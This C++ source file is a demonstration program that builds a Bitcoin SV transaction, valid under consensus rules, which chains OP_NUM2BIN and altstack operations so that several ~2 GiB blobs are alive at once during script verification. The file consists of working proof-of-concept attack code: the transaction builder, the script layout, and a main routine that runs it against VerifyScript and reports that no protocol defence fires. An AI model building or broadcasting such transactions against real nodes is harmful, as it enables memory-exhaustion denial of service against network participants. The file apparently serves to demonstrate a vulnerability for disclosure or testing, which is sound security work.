/// example_num2bin_memoryattack.cpp
///
/// Demonstrates the OP_NUM2BIN simultaneous memory allocation attack.
///
/// A transaction is constructed where N simultaneous ~2 GiB blobs are kept
/// alive on the script stack at the same time, forcing the node to allocate
/// N × ~2 GiB of RAM during a single VerifyScript call.
///
/// The transaction is consensus-valid (returns SCRIPT_ERR_OK) because:
///   - SCRIPT_VERIFY_CLEANSTACK is never set in GetBlockScriptFlags
///   - maxStackSize = INT64_MAX in consensus mode (post-Genesis activation)
///   - The final stack top is INT32_MAX (truthy)
///
/// Script design for N = num-chains:
///
///   scriptSig :   N × [ <0x01> <INT32_MAX> ]
///
///   Stack on entry (bottom → top):
///     [ data_1 | SIZE | data_2 | SIZE | ... | data_N | SIZE ]
///
///   scriptPubKey (for N=3 as illustration):
///     OP_NUM2BIN   → blob_3 (~2 GiB)   stack: [ d1|SZ | d2|SZ | blob_3 ]
///     OP_TOALTSTACK                     alt:   [ blob_3 ]
///     OP_NUM2BIN   → blob_2             stack: [ d1|SZ | blob_2 ]
///     OP_TOALTSTACK                     alt:   [ blob_3 | blob_2 ]
///     OP_NUM2BIN   → blob_1  ← PEAK: N blobs live simultaneously
///     OP_FROMALTSTACK  (×N-1)           reassemble on main stack
///     OP_DROP          (×N-1)           discard all but blob_1
///     OP_SIZE OP_NIP                    final top = INT32_MAX → truthy → VALID

#include <cassert>
#include <iomanip>
#include <iostream>
#include <limits>
#include <string>
#include <vector>

#include <boost/program_options.hpp>

#include "chainparams.h"
#include "script/script_num.h"
#include "util.h"

#include "assembler.h"
#include "extendedTx.hpp"
#include "txvalidator.hpp"
#include "utilstrencodings.h"

namespace po = boost::program_options;

// ============================================================
// Fixed parameters
// ============================================================

static constexpr int32_t UTXO_HEIGHT  = 620539; // post-Genesis UTXO (Genesis @ 620538)
static constexpr int32_t BLOCK_HEIGHT = 720540; // post-Genesis spending block
static constexpr bool    CONSENSUS    = true;   // block-validation mode (skips IsStandardTx)

// ============================================================
// Transaction building helpers
// ============================================================

static CMutableTransaction BuildCreditingTransaction(const CScript& scriptPubKey,
                                                      const Amount nValue)
{
    CMutableTransaction txCredit;
    txCredit.nVersion = 1;
    txCredit.nLockTime = 0;
    txCredit.vin.resize(1);
    txCredit.vout.resize(1);
    txCredit.vin[0].prevout = COutPoint();
    txCredit.vin[0].scriptSig = CScript() << CScriptNum(0) << CScriptNum(0);
    txCredit.vin[0].nSequence = CTxIn::SEQUENCE_FINAL;
    txCredit.vout[0].scriptPubKey = scriptPubKey;
    txCredit.vout[0].nValue = nValue;
    return txCredit;
}

static CMutableTransaction BuildSpendingTransaction(const CScript& scriptSig,
                                                     const CMutableTransaction& txCredit)
{
    CMutableTransaction txSpend;
    txSpend.nVersion = 1;
    txSpend.nLockTime = 0;
    txSpend.vin.resize(1);
    txSpend.vout.resize(1);
    txSpend.vin[0].prevout = COutPoint(txCredit.GetId(), 0);
    txSpend.vin[0].scriptSig = scriptSig;
    txSpend.vin[0].nSequence = CTxIn::SEQUENCE_FINAL;
    txSpend.vout[0].scriptPubKey = CScript();
    txSpend.vout[0].nValue = txCredit.vout[0].nValue;
    return txSpend;
}

// ============================================================
// Attack transaction builder
// ============================================================
//
// scriptSig  : N × [ <0x01> <INT32_MAX> ]
//              Post-Genesis consensus sets SCRIPT_VERIFY_SIGPUSHONLY — only push
//              opcodes are allowed in scriptSig; this is satisfied here.
//
// scriptPubKey:
//   (N-1) × [ OP_NUM2BIN  OP_TOALTSTACK ]   allocate blob, park on altstack
//   OP_NUM2BIN                               allocate last blob  ← PEAK memory
//   (N-1) × OP_FROMALTSTACK                  reassemble all blobs on main stack
//   (N-1) × OP_DROP                          drop all but the last blob
//   OP_SIZE  OP_NIP                          leave INT32_MAX (truthy) as sole top item
//
// Final state: stack = [ INT32_MAX ] → truthy → SCRIPT_ERR_OK → consensus-valid.

static bsv::CMutableTransactionExtended BuildMemoryAttackTransaction(
    const std::string& network, int numChains)
{
    SelectParams(network, std::nullopt);

    static constexpr int64_t NUM2BIN_SIZE = std::numeric_limits<int32_t>::max(); // ~2 GiB

    // scriptSig: N pairs of (1-byte data, INT32_MAX target size)
    CScript scriptSig;
    const std::vector<uint8_t> oneByteData{0x01};
    for (int i = 0; i < numChains; ++i) {
        scriptSig << oneByteData;
        scriptSig << CScriptNum(NUM2BIN_SIZE);
    }

    // scriptPubKey
    CScript scriptPubKey;
    for (int i = 0; i < numChains - 1; ++i)
        scriptPubKey << OP_NUM2BIN << OP_TOALTSTACK;
    scriptPubKey << OP_NUM2BIN;             // Nth blob — peak memory reached here
    for (int i = 0; i < numChains - 1; ++i)
        scriptPubKey << OP_FROMALTSTACK;
    for (int i = 0; i < numChains - 1; ++i)
        scriptPubKey << OP_DROP;
    scriptPubKey << OP_SIZE << OP_NIP;      // leaves INT32_MAX (truthy) — valid termination

    const Amount amount{1000000};
    CMutableTransaction txCredit = BuildCreditingTransaction(scriptPubKey, amount);
    CMutableTransaction txSpend  = BuildSpendingTransaction(scriptSig, txCredit);

    bsv::CMutableTransactionExtended eTX;
    eTX.vutxo = txCredit.vout;
    eTX.mtx   = txSpend;
    return eTX;
}

// ============================================================
// main
// ============================================================

int main(int argc, char* argv[])
{
    int numChains = 2;

    po::options_description desc("OP_NUM2BIN simultaneous memory allocation attack");
    desc.add_options()
        ("help,h",
            "Show this help message")
        ("num-chains,n",
            po::value<int>(&numChains)->default_value(2),
            "Number of simultaneous ~2 GiB blobs to keep alive on the stack at peak "
            "(default: 2, peak ~4 GiB). "
            "WARNING: each additional chain adds ~2 GiB of peak RAM usage.");

    po::variables_map vm;
    try {
        po::store(po::parse_command_line(argc, argv, desc), vm);
        if (vm.count("help")) {
            std::cout << desc << "\n";
            return 0;
        }
        po::notify(vm);
    }
    catch (const po::error& e) {
        std::cerr << "Argument error: " << e.what() << "\n" << desc << "\n";
        return 1;
    }

    if (numChains < 1) {
        std::cerr << "Error: --num-chains must be >= 1\n";
        return 1;
    }

    const std::string network = CBaseChainParams::MAIN;

    const double blobGiB = static_cast<double>(std::numeric_limits<int32_t>::max())
                           / (1024.0 * 1024.0 * 1024.0);
    const double peakGiB = numChains * blobGiB;

    std::cout << std::fixed
              << "=======================================================\n"
              << "  OP_NUM2BIN Simultaneous Memory Allocation Attack\n"
              << "=======================================================\n"
              << "  num-chains  : " << numChains << "\n"
              << "  blob size   : INT32_MAX = "
              << std::numeric_limits<int32_t>::max()
              << " bytes  (~" << std::setprecision(2) << blobGiB << " GiB)\n"
              << "  peak memory : " << numChains << " x ~" << blobGiB
              << " GiB  =  ~" << std::setprecision(1) << peakGiB << " GiB\n"
              << "  consensus   : true  (block-validation mode)\n"
              << "\n";

    std::cout << "Building attack transaction... " << std::flush;
    const bsv::CMutableTransactionExtended eTX =
        BuildMemoryAttackTransaction(network, numChains);
    std::cout << "done\n";

    CDataStream out(SER_NETWORK, PROTOCOL_VERSION);
    out << eTX;
    const std::vector<uint8_t> etxBin(out.begin(), out.end());
    std::cout << "  Serialized size : " << etxBin.size() << " bytes\n\n";

    const std::array<int32_t, 1> utxoArray = {UTXO_HEIGHT};
    const bsv::CTxValidator se(network);

    std::cout << "Calling VerifyScript (consensus=true)... " << std::flush;
    const ScriptError ret = se.VerifyScript(
        etxBin, std::span<const int32_t>(utxoArray), BLOCK_HEIGHT, CONSENSUS);
    std::cout << "done\n\n";

    if (ret == SCRIPT_ERR_OK) {
        std::cout << "Result : VALID  (SCRIPT_ERR_OK)\n"
                  << "\n"
                  << "A transaction that forces " << numChains
                  << " simultaneous ~2 GiB stack allocations\n"
                  << "(peak ~" << std::setprecision(1) << peakGiB << " GiB) "
                  << "is consensus-valid. No protocol defence fires:\n"
                  << "  - maxStackSize = INT64_MAX (post-Genesis consensus mode)\n"
                  << "  - SCRIPT_VERIFY_CLEANSTACK not set in GetBlockScriptFlags\n";
        return 0;
    }

    std::cout << "Result : INVALID  (error code " << static_cast<int>(ret) << ")\n";
    return 1;
}
